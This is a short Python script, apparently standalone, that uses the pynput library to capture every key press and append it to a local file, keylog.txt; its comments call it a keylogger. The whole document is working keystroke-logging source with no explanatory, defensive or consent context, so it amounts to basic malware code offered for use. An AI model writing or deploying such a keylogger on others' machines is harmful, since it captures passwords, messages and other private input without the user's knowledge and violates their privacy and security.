from pynput.keyboard import Key, Listener

# Define a function to write the key presses to a log file.
def write_to_log(key):
    with open("keylog.txt", "a") as log_file:
        log_file.write(str(key) + "\n")

# Define a function that listens for key presses and writes them to the log file.
def on_key_press(key):
    write_to_log(key)

# Set up the keylogger
with Listener(on_press=on_key_press) as listener:
    listener.join()
